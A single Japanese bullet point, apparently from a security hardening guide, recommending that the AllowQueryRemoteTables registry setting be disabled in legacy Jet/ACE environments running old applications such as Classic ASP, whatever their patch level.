- **レガシーなJet/ACE環境では`AllowQueryRemoteTables`を必ず無効化する**: Classic ASP等の古いアプリケーションが稼働し続けている環境では、パッチ適用状況にかかわらずレジストリ設定の確認が欠かせない。
